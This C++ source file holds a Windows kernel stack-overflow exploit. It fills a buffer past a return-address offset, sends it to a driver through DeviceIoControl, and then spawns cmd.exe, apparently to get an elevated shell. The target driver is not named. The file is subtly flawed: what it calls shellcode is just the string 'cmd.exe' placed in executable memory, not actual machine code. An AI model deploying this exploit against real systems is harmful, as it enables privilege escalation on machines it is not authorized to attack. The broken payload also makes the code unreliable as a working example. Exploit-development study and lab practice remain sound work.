#include "include/exp/stackoverflow.hpp"

namespace exploit
{
    namespace stackoverflow
    {
        void StackOverflow(HANDLE hDevice, unsigned int ioctl) {
            char stackspace[0x1000] = { 0 };
            char cmd[] = "cmd.exe";
            DWORD oldProtect;

            printf("[*] Start Exploit\n");
            LPVOID shellcode_addr = VirtualAlloc(NULL,
                sizeof(cmd),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
            memcpy(shellcode_addr, cmd, sizeof(cmd));

            unsigned int size = 0x820;
            RtlFillMemory(stackspace, 0x810, 'A');
            *(unsigned long long*)(stackspace + 0x818) = (unsigned long long)shellcode_addr;

            DWORD info = 0;


            printf("shellcode space %p\n", shellcode_addr);
            printf("[*] Spawning a new cmd.exe process\n");

            system("pause");

            DeviceIoControl(hDevice, ioctl,
                stackspace, size,
                NULL, 0,
                &info, NULL);
            printf("info: %d\n", info);
            system("cmd.exe");
        }
    } // namespace stackoverflow

} // namespace exp
